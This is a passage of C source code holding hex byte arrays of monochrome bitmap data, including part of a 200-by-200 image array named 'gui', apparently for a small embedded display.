0XFF,0XF8,0X00,0X1F,0XFF,0XFE,0X00,0X00,0X00,0X30,0X00,0X00,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X3F,0XFF,0XF8,0X00,
0X00,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X80,0X00,0X3F,0XFF,0XE0,0X00,0X03,0X00,0X00,0X00,0X01,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X3F,0XFF,
0XC0,0X00,0X06,0X00,0X00,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X3F,0XFF,0X00,0X00,0X0E,0X00,0X00,0X00,0X07,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,
0X3F,0XFC,0X00,0X00,0X1E,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X3F,0XF0,0X00,0X00,0X7E,0X00,0X00,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,
0X00,0X00,0X3F,0XC0,0X00,0X00,0XFC,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X7F,0X00,0X00,0X03,0XFC,
0X00,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFC,0X00,0X00,0X00,0X7C,0X00,0X00,0X07,0XFC,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,0X78,0X00,0X00,
0X0F,0XFC,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X00,0X00,0X00,0X60,0X00,0X00,0X1F,0XFC,0X00,0X00,0X3F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X00,0X00,
0X00,0X00,0X7F,0XF8,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X03,0X00,0X00,0X00,0X00,0XFF,0XF8,0X00,0X03,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X06,
0X00,0X00,0X00,0X03,0XFF,0XF8,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X0E,0X00,0X00,0X00,0X07,0XFF,0XF0,0X00,
0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,
0X00,0X1E,0X00,0X00,0X00,0X0F,0XFF,0XF0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X1E,0X00,0X00,0X00,0X1F,0XFF,
0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X00,0X00,0X00,0X3E,0X00,0X00,0X00,0X7F,0XFF,0XF0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0XFE,0X00,0X00,0X00,
0XFF,0XFF,0XF0,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X00,0X01,0XFC,0X00,0X00,0X03,0XFF,0XFF,0XE0,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X03,0XFC,0X00,
0X00,0X07,0XFF,0XFF,0XE0,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X03,0XFC,0X00,0X00,0X0F,0XFF,0XFF,0XE0,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X07,
0XFC,0X00,0X00,0X1F,0XFF,0XFF,0XE1,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X0F,0XFC,0X00,0X00,0X7F,0XFF,0XFF,0XC7,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,
0X00,0X1F,0XF8,0X00,0X00,0XFF,0XFF,0XFF,0XCF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X3F,0XF8,0X00,0X03,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X80,0X00,0X7F,0XF8,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0XFF,0XF8,0X00,0X1F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X80,0X01,0XFF,0XF8,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X03,0XFF,0XF8,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X07,0XFF,0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,
0XFF,0XF0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XF0,0X07,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X80,0X3F,0XFF,0XF0,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X7F,0XFF,0XF0,0X3F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X80,0XFF,0XFF,0XE0,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC1,0XFF,0XFF,0XE0,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XC3,0XFF,0XFF,0XE3,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC7,0XFF,0XFF,
0XE7,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XCF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XDF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,};


const unsigned char gui[5000] = { /* 0X01,0X01,0XC8,0X00,0XC8,0X00, */
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X3F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X7C,0X7C,0X7F,0XFF,0XFF,0XFF,
0XE0,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XE3,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X3C,0X38,0X7F,0XFF,
0XFF,0XFF,0XE1,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XE0,0X0F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X7C,0X3C,0X38,
0X7F,0XFF,0XFF,0XFF,0XF0,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X7C,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XF8,0X3F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X7C,
0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0XF0,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X7C,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,
0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0XFF,0XFF,0XFF,0XFF,
0XC1,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XF8,0X00,0X1F,0XFF,0XFF,0XFF,0XC3,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,
0XFF,0XFF,0X07,0XE0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X07,0XFF,
0XFF,0XFF,0X87,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X1F,0XF8,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X01,0XFF,0XFF,0XFF,0X87,0XFC,0X3C,0X38,0X7F,
0XFF,0XFF,0XFF,0XFE,0X1F,0XFC,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X03,0XFF,
0X80,0XFF,0XFF,0XFF,0X87,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X3F,0XFC,0X7F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X0F,0XFF,0XF0,0X3F,0XFF,0XFF,0X87,0XFC,0X3C,
0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X3F,0XFC,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,
0X3F,0XFF,0XF8,0X1F,0XFF,0XFF,0XC3,0XF8,0X7C,0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X3F,
0XFC,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0XFF,0XFF,0XFE,0X0F,0XFF,0XFF,0XC3,
0XF8,0X7C,0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X1F,0XF8,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X81,0XFF,0XFF,0XFF,0X0F,0XFF,0XFF,0XE0,0XE0,0XFC,0X38,0X7F,0XFF,0XFF,0XFF,
0XFF,0X0F,0XF0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X07,0XFF,0XFF,0XFF,0X87,0XFF,
0XFF,0XE0,0X00,0XFC,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X8F,0XF0,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X0F,0XFF,0XFF,0XFF,0XC3,0XFF,0XFF,0XF0,0X01,0XFC,0X38,0X7F,0XFF,
0XFF,0XFF,0XFF,0XDF,0XF9,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X3F,0X03,0XFF,0XE3,
0XC3,0XFF,0XFF,0XFC,0X07,0XFC,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XE0,0X7E,0X01,0XFF,0XC3,0XE1,0XFF,0XFF,0XFF,0XFF,0XFC,0X38,
0X7F,0X87,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X87,0XFF,0XFF,0XFF,0XC0,0XFC,0X01,
0XFF,0X83,0XE1,0XFF,0XFF,0XFF,0XFF,0XFC,0X38,0X7F,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFC,0X01,0XFF,0XFF,0XFF,0X81,0XFC,0X30,0XFF,0X07,0XF0,0XFF,0XFF,0XFF,0XFF,
0XFC,0X38,0X7F,0X80,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X7F,0XFF,0XFE,0X07,
0XFC,0X70,0XFE,0X0F,0XF0,0XFF,0XFF,0XFF,0XFF,0XFC,0X38,0X7F,0XC0,0X7F,0XFF,0XFF,
0X80,0X00,0X00,0X20,0X20,0X3F,0XFF,0XFC,0X0F,0XFC,0X70,0XFC,0X1F,0XF0,0XFF,0XFF,
0XFC,0X3F,0XFC,0X38,0X7F,0XF0,0X7F,0XFF,0XFC,0X00,0X00,0X00,0X01,0XFC,0X1F,0XFF,
0XF8,0X3F,0XFC,0X20,0XF8,0X3F,0XF8,0X7F,0XFF,0XF0,0X1F,0XFC,0X38,0X7F,0XF8,0X3F,
0XFF,0XF8,0X00,0X00,0X00,0X03,0XFE,0X1F,0XFF,0XE0,0X7F,0XFC,0X01,0XF0,0X7F,0XF8,
0X7F,0XFF,0XC0,0X3F,0XFC,0X38,0X7F,0XFC,0X1F,0XFF,0XF0,0X00,0X00,0X00,0X07,0XDF,
0X0F,0XFF,0XC0,0XFF,0XFE,0X01,0XE0,0XFF,0XF8,0X7F,0XFF,0X80,0X7F,0XFC,0X38,0X7F,
0XFE,0X1F,0XFF,0XF0,0XFF,0XFF,0XFF,0XFF,0X07,0X8F,0XFF,0X03,0XFF,0XFF,0X07,0XC1,
0XFF,0XF8,0X7F,0XFF,0X03,0XFF,0XFC,0X38,0X7F,0XFE,0X1F,0XFF,0XE1,0XFF,0XFF,0XFF,
0XFE,0X03,0X87,0XFF,0X03,0XFF,0XFF,0XFF,0X83,0XE3,0XF8,0X7F,0XFE,0X0F,0XFF,0XFC,
0X38,0X7F,0XFF,0X1F,0XFF,0XE3,0XFF,0XC0,0X00,0X00,0X03,0X87,0XFF,0X81,0XFF,0XFF,
0XFF,0X07,0X80,0XF8,0X7F,0XFC,0X1F,0XFF,0XFC,0X38,0X7F,0XFF,0X1F,0XFF,0XE3,0XFF,
0XC0,0X00,0X00,0X03,0X87,0XFF,0XC0,0X7F,0XFF,0XFE,0X0F,0X00,0X78,0X7F,0XFC,0X3F,
0XFF,0XFC,0X38,0X7F,0XFF,0X1F,0XFF,0XE1,0XFF,0XE0,0X00,0X00,0X03,0X87,0XFF,0XF0,
0X3F,0XFF,0XFC,0X1F,0X00,0X78,0X7F,0XF8,0X7F,0XFF,0XFC,0X38,0X7F,0XFE,0X1F,0XFF,
0XF1,0XFF,0XFF,0XFF,0XFF,0X03,0X87,0XFF,0XF8,0X1F,0XFF,0XF8,0X3E,0X1C,0X38,0XFF,
0XF8,0X7F,0XFF,0XFC,0X3C,0X3F,0XFE,0X1F,0XFF,0XF0,0X7F,0XFF,0XFF,0XFF,0X8F,0X8F,
0XFF,0XFE,0X07,0XFF,0XF0,0X7E,0X1C,0X30,0XFF,0XF8,0XFF,0XFF,0XFC,0X3C,0X3F,0XFE,
0X1F,0XFF,0XF8,0X00,0X00,0X00,0X03,0XFF,0X0F,0XFF,0XFF,0X03,0XFF,0XE0,0XFE,0X1C,
0X30,0XFF,0XF0,0XFF,0XFF,0XFC,0X3C,0X1F,0XFC,0X3F,0XFF,0XFC,0X00,0X00,0X00,0X01,
0XFE,0X1F,0XFF,0XFF,0XC1,0XFF,0XC1,0XFF,0X00,0X71,0XFF,0XF0,0XFF,0XFF,0XFC,0X3E,
0X0F,0XF8,0X3F,0XFF,0XFF,0X00,0X00,0X00,0X00,0X78,0X3F,0XFF,0XFF,0XE0,0X7F,0X83,
0XFF,0X00,0X61,0XFF,0XF0,0XFF,0XFF,0XFC,0X3F,0X07,0XE0,0X7F,0XFF,0XFF,0X8F,0XE3,
0XF8,0XF0,0X00,0X7F,0XFF,0XFF,0XF0,0X3F,0X87,0XFF,0X80,0XE1,0XFF,0XF0,0XFF,0XFF,
0XFC,0X7F,0X80,0X00,0XFF,0XFF,0XFF,0X8F,0XE3,0XF8,0XFC,0X00,0XFF,0XFF,0XFF,0XF8,
0X1F,0XCF,0XFF,0XE3,0XC3,0XFF,0XF0,0XFF,0XFF,0XFC,0X7F,0XC0,0X01,0XFF,0XFF,0XFF,
0X8F,0XE3,0XF8,0XFF,0X03,0XFF,0XFF,0XFF,0XFE,0X07,0XFF,0XFF,0XFF,0X87,0XFF,0XF0,
0XFF,0XFF,0XFC,0X7F,0XF0,0X07,0XFF,0XFF,0XFF,0X8F,0XE3,0XFD,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X03,0XFF,0XFF,0XFF,0X07,0XFF,0XF0,0XFF,0XFF,0XF8,0X7F,0XFE,0X3F,0XFF,
0XFF,0XFF,0X8F,0XE3,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0XFF,0XFF,0XFE,0X0F,
0XFF,0XF8,0XFF,0XFF,0XF8,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0X8F,0XF7,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XE0,0X7F,0XFF,0XFC,0X1F,0XFF,0XF8,0X7F,0XFF,0XF8,0X7F,0XFF,
0XFF,0XFF,0XFF,0XFF,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X1F,0XFF,
0XF0,0X3F,0XFF,0XF8,0X7F,0XFF,0XF0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X07,0XFF,0XC0,0X7F,0XFF,0XFC,0X3F,0XFF,0XE0,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,
0X00,0XFE,0X00,0XFF,0XFF,0XFC,0X1F,0XFF,0XC1,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X03,0XFF,0XFF,0XFE,0X0F,
0XFF,0X83,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XF0,0X00,0X0F,0XFF,0XFF,0XFF,0X03,0XFE,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,
0XFF,0X80,0X30,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XF0,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X01,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
